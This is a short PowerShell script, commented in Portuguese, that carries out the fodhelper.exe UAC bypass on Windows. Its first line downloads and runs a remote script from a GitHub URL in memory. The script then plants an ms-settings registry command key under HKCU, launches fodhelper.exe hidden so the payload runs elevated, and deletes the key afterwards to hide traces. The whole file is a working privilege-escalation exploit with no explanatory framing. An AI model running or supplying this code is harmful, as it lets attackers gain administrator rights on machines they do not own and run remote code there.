iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EugeneBelford1995/Invoke-BypassII/main/Invoke-BypassII.ps1'))

# Cria uma nova ação para o bypass (abrir o PowerShell)
$program = "powershell.exe -NoExit -Command Write-Host 'Admin!'"
# Cria a estrutura de registro que o Invoke-BypassII usa
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
# Dispara o bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
# Limpa o registro
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force